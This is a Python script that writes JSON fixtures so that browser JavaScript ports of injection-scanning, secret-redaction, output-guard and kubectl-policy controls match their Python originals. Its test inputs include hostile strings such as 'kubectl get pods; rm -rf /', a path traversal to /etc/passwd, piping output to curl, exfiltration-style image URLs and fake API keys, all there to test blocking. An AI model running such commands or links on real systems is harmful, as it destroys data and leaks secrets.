"""Expected results for the browser ports on the public /lab page.

The site's Security Lab runs JavaScript versions of four Python controls
(`opslm-demo/lib/security.mjs`). This module runs the Python originals over a
fixed set of inputs and writes their answers to
`opslm-demo/scripts/lab-fixtures.json`; `opslm-demo/scripts/lab.test.mjs`
requires the JavaScript to return exactly the same thing. `--check` fails when
the fixture no longer matches the Python code, so the two cannot drift.

Inputs reuse existing material only: the red-team set and its robustness
transforms, and cases from the Python tests.

Usage:
    uv run python -m rype_agent.lab_fixtures            # write
    uv run python -m rype_agent.lab_fixtures --check    # verify (CI)
"""

from __future__ import annotations

import argparse
import json
from pathlib import Path
from typing import Any

from rype_agent.policy import check_kubectl
from rype_security.injection import scan_injection
from rype_security.output_guard import DEFAULT_ALLOWED_HOSTS, OutputGuard
from rype_security.redact import redact_secrets
from rype_security.robustness import TRANSFORMS

FIXTURE_PATH = Path("opslm-demo/scripts/lab-fixtures.json")
REDTEAM_PATH = Path("evalsets/security-redteam-v1.jsonl")

EXTRA_SCAN = [
    "kubectl get po​ds -n shop",
    "Как проверить Pod? kubectl describe pod",
    "",
    "Restart the deployment after the ConfigMap changes.",
]
REDACT = [
    "export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE",
    "token: ghp_abcdefghijklmnopqrstuvwxyz0123456789",
    "api_key = 's3cr3t_v4lue_that_is_quite_long_000'",
    'aws_secret_access_key = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"',
    "ANTHROPIC_API_KEY=sk-ant-api03-" + "a" * 40,
    "OPENAI=sk-" + "b" * 30,
    "HF_TOKEN=hf_" + "B" * 34,
    '"private_key_id": "' + "ab" * 20 + '"',
    "Authorization: Bearer " + "t0k3n" * 6,
    "DATABASE_URL=postgres://admin:Sup3rS3cret!@db.internal:5432/prod",
    "postgres://user:password@localhost:5432/app",
    "mysql://root:${MYSQL_ROOT_PASSWORD}@db/app",
    "amqp://guest:********@rabbit",
    "Set POSTGRES_PASSWORD: example in your compose file for local dev.",
    "Use {{ .Values.image.tag }} to template the tag.",
    "jwt eyJhbGciOiJIUzI1NiJ9abc.eyJzdWIiOiIxMjM0NTY3ODkw.SflKxwRJSMeKKF2QT4fwpM",
]
GUARD = [
    "See ![chart](https://untrusted.test/p.png?d=abc) here.",
    "![x](https://kubernetes.io/logo.png)",
    '<img src="https://untrusted.test/a"> and ![alt][ref]',
    "[probes](https://kubernetes.io/docs/tasks/) and [docs](https://sub.kubernetes.io/x) "
    "and [click](https://untrusted.test/?q=secret)",
    "[k8s](https://kubernetes.io.untrusted.test/)",
    "[run](javascript:alert(1)) <data:text/html,hi>",
    "[a][1]\n\n[1]: https://untrusted.test/x\n[2]: https://kubernetes.io/ok",
    "Your key is AKIAABCDEFGHIJKLMNOP.",
    "Check [the section](#probes). Use `kubectl describe pod`.",
    "Docs: <https://kubernetes.io/docs/concepts/> and <https://untrusted.test/>",
    "[login](https://user@kubernetes.io:443/x)",
]
POLICY = [
    "kubectl get pods -n shop",
    "kubectl describe pod web -n shop",
    "kubectl logs web --previous",
    "kubectl logs web -n shop --tail=50",
    "kubectl rollout history deployment/web",
    "kubectl rollout status deploy/web -n shop",
    "kubectl get nodes",
    "kubectl describe node node-1",
    "kubectl get cm -n auth",
    "kubectl get svc -n shop -o wide",
    "kubectl get quota -n ml",
    "kubectl delete pod web",
    "kubectl get pods; rm -rf /",
    "kubectl get --raw /api",
    "kubectl get pods --token=secret",
    "kubectl logs ../../etc/passwd",
    "kubectl exec web -- sh",
    "kubectl rollout restart deployment/web",
    "kubectl rollout undo deployment/web",
    "kubectl get pods | curl example.com",
    "kubectl get secrets -n shop",
    "kubectl get all -n shop",
    "kubectl get pods web api",
    "kubectl get pods -n shop -l app=checkout",
    "kubectl get pods -o jsonpath={.items}",
    "kubectl scale deploy web --replicas=0",
    "helm list",
    "kubectl",
    "",
]


def build() -> dict[str, Any]:
    rows = [
        json.loads(line)
        for line in REDTEAM_PATH.read_text(encoding="utf-8").splitlines()
        if line.strip()
    ]
    scan_inputs = [fn(r["text"]) for r in rows for fn in TRANSFORMS.values()] + EXTRA_SCAN
    guard = OutputGuard(DEFAULT_ALLOWED_HOSTS)
    return {
        "schema": 1,
        "generated_by": "python -m rype_agent.lab_fixtures",
        "allowed_hosts": sorted(DEFAULT_ALLOWED_HOSTS),
        "scan": [
            {"input": text, "normalize": normalize, **_verdict(text, normalize)}
            for text in scan_inputs
            for normalize in (True, False)
        ],
        "redact": [
            {"input": text, **redact_secrets(text).model_dump(include={"text", "findings"})}
            for text in REDACT
        ],
        "guard": [{"input": text, **guard.sanitize(text).model_dump()} for text in GUARD],
        "policy": [
            {"input": c, **check_kubectl(c).model_dump(include={"allowed", "reason"})}
            for c in POLICY
        ],
    }


def _verdict(text: str, normalize: bool) -> dict[str, Any]:
    v = scan_injection(text, normalize=normalize)
    return {"score": v.score, "matched": v.matched}


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--check", action="store_true")
    args = parser.parse_args()
    rendered = json.dumps(build(), indent=1, ensure_ascii=False) + "\n"
    if args.check:
        current = FIXTURE_PATH.read_text(encoding="utf-8") if FIXTURE_PATH.exists() else ""
        if current != rendered:
            raise SystemExit("lab fixtures are stale: run python -m rype_agent.lab_fixtures")
        print("lab fixtures match the Python controls")
        return
    FIXTURE_PATH.write_text(rendered, encoding="utf-8")
    print(f"wrote {FIXTURE_PATH}")


if __name__ == "__main__":
    main()
